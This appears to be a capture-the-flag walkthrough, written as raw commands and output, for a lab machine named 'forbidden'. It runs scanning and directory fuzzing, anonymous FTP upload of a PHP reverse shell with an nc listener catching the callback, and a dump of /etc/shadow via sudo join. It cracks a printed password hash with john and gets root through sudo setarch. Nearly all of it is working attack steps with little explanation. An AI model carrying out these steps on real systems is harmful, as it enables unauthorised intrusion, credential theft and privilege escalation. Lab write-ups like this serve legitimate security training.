@@ -1,0 +1,174 @@
+fping -aqg 10.0.2.1/24
+----------------------------
+nmap -A -v -p- -T4 10.0.2.79
+----------------------------
+Discovered open port 21/tcp on 10.0.2.79 --> login anonymously
+Discovered open port 80/tcp on 10.0.2.79
+
+
+┌──(root💀kali)-[/home/kali]
+└─# ffuf -c -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.79/FUZZ -e .html,.txt     
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.79/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Extensions       : .html .txt 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+                        [Status: 200, Size: 241, Words: 36, Lines: 9]
+index.html              [Status: 200, Size: 241, Words: 36, Lines: 9]
+robots.txt              [Status: 200, Size: 10, Words: 1, Lines: 2]
+note.txt                [Status: 200, Size: 75, Words: 12, Lines: 2]
+                        [Status: 200, Size: 241, Words: 36, Lines: 9]
+
+
+index.html --> SECURE WEB/FTP
+Hi, Im the best admin of the world. You cannot execute .php code on this server so you cannot obtain a reverse shell. Not sure if its misconfigured another things... but the importart is that php is disabled. -marta 
+
+note.txt --> The extra-secured .jpg file contains my password but nobody can obtain it.
+
+login ftp as anonymous
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# ftp 10.0.2.79                                                                                         148 ⨯ 5 ⚙
+Connected to 10.0.2.79.
+220 (vsFTPd 3.0.3)
+Name (10.0.2.79:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Mar 29 14:38 www
+226 Directory send OK.
+ftp> cd www
+250 Directory successfully changed.
+ftp> put reverse_shell.php5
+
+--------------------------------------------------------------------------------------------------------------------------
+nc -nvlp 6666
+http://10.0.2.79/reverse_shell.php5
+---------------------------------------------------------------------------------------------------------------------------
+listening on [any] 6666 ...
+connect to [10.0.2.52] from (UNKNOWN) [10.0.2.79] 53322
+Linux forbidden 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
+ 14:55:05 up 35 min,  0 users,  load average: 0.00, 0.05, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c "import pty;pty.spawn('/bin/bash')"
+www-data@forbidden:/$ export TERM=xterm
+export TERM=xterm
+www-data@forbidden:/$ 
+--------------------------------------------------------------------------------------------------------------------
+##www-data to marta##
+cd /var/www/html/ --> TOPSECRETIMAGE.jpg
+su - marta
+Password: TOPSECRETIMAGE
+marta@forbidden:~$ 
+-----------------------------------------------------------------------------------------------------------------------
+##marta to peter##
+marta@forbidden:~$ sudo -l
+sudo -l
+Matching Defaults entries for marta on forbidden:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User marta may run the following commands on forbidden:
+    (ALL : ALL) NOPASSWD: /usr/bin/join
+marta@forbidden:~$ sudo join -a 1 /etc/shadow /etc/shadow
+sudo join -a 1 /etc/shadow /etc/shadow
+root:$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51:18544:0:99999:7:::
+daemon:*:18544:0:99999:7:::
+bin:*:18544:0:99999:7:::
+sys:*:18544:0:99999:7:::
+sync:*:18544:0:99999:7:::
+games:*:18544:0:99999:7:::
+man:*:18544:0:99999:7:::
+lp:*:18544:0:99999:7:::
+mail:*:18544:0:99999:7:::
+news:*:18544:0:99999:7:::
+uucp:*:18544:0:99999:7:::
+proxy:*:18544:0:99999:7:::
+www-data:*:18544:0:99999:7:::
+backup:*:18544:0:99999:7:::
+list:*:18544:0:99999:7:::
+irc:*:18544:0:99999:7:::
+gnats:*:18544:0:99999:7:::
+nobody:*:18544:0:99999:7:::
+_apt:*:18544:0:99999:7:::
+systemd-timesync:*:18544:0:99999:7:::
+systemd-network:*:18544:0:99999:7:::
+systemd-resolve:*:18544:0:99999:7:::
+messagebus:*:18544:0:99999:7:::
+marta:$6$h.4ZF5esZ/N1OIcu$8vL1D3iM6iuhniSG8nIz0582atbIV6y/UBl0eks1.Wrd51BqLK8Wqt91WXg0Y2mrdNY4luPQkqUWXFXWxLVwe/:18544:0:99999:7:::
+systemd-coredump:!!:18544::::::
+ftp:*:18544:0:99999:7:::
+sshd:*:18544:0:99999:7:::
+markos:$6$PTerrFpyfOmkM5Xi$oo8gNZyyxsZbKhOIXrm2w/x.Xvhdr7Ny/4JgLDRLRAxAwEwGtH2kD7PjzeloAstqCPq/KKrqrPioMM8vwWbqZ.:18544:0:99999:7:::
+peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:::
+
+ON KALI MACHINE : echo 'peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:::' > hash
+ON KALI MACHINE : john -wordlist=<rockyou.txt locate> hash
+peter:boomer
+
+marta@forbidden:~$ su - peter
+su - peter
+Password: boomer
+
+peter@forbidden:~$ 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+##peter to root##
+
+peter@forbidden:~$ sudo -l
+sudo -l
+Matching Defaults entries for peter on forbidden:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User peter may run the following commands on forbidden:
+    (ALL : ALL) NOPASSWD: /usr/bin/setarch
+
+peter@forbidden:~$ uname -a
+uname -a
+Linux forbidden 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
+(arch = x86_64)
+
+peter@forbidden:~$ sudo setarch x86_64 /bin/bash
+sudo setarch x86_64 /bin/bash
+root@forbidden:/home/peter# 
+--------------------------------------------------------------------------------------------------
+root@forbidden:/home/peter# id ; uname -a ; whoami; hostname
+id ; uname -a ; whoami; hostname
+uid=0(root) gid=0(root) groups=0(root)
+Linux forbidden 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
+root
+forbidden
+
+
+
+
+
+
+
+
+
